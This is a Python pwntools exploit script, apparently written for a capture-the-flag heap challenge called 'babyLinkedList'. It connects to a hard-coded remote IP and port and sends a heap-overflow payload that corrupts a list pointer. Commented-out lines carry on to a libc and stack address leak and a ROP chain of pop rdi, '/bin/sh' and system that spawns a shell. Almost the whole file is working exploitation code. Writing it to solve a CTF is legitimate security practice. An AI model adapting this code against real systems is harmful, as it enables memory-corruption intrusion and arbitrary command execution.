from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

libc = ELF('./libc.so')
key = 0
debug = 1
ip = '47.102.111.242'
port = 8002
if debug:
    io = remote(ip,port)
else:
    io = process(argv=['./libc.so', './babyLinkedList'])
        
def p():
    gdb.attach(proc.pidof(io)[0])
    
def add(size,text):
    io.sendlineafter('>>','1')
    io.sendlineafter('Please input size',str(size))
    io.sendafter('Please input content',text)
    
def free():
    io.sendlineafter('>>','2')
    
def show():
    io.sendlineafter('>>','3')
    
def edit(text):
    io.sendlineafter('>>','4')
    io.send(text)

# p()    
add(0x18,'aaaa')
# free()
# p()
add(0x18,'aaaa')
add(0x18,'aaaa')
add(0x18,'aaaa')
# for i in range(8):
# 	add(0xb0,b'aaaa')

# for i in range(8):
# 	free()

payload = b'a'*0x1e + p64(0x000e870000000000) + b'\x60'
edit(payload)
show()

# io.recvuntil('Content: ')
# libcbase = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0xa6d40
# envir = libcbase + 0xa5d00
# success('libcbase-->'+hex(libcbase))
# success('envir-->'+hex(envir))
# # p()
# free()
# payload = b'a'*0x1e + p64(0x000a850000000000) + p64(envir)
# edit(payload)
# show()
# io.recvuntil('Content: ')
# stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x8
# #  0x7ffd449cd068
# success('stack-->'+hex(stack))
# system = libcbase + libc.symbols['system']
# pop_rdi = libcbase + 0x0000000000015c8e #: pop rdi ; ret
# binsh = libcbase + 0x9daf0  #0xa120f
# success('system-->'+hex(system))
# pause()

# add(0x18,'aaaa')
# payload = b'a'*0x1e + p64(0x0012890000000000) + p64(stack)
# # p()
# edit(payload)
# payload = b'a' *6 + p64(pop_rdi) + p64(binsh) + p64(system)
# edit(payload)


io.interactive()
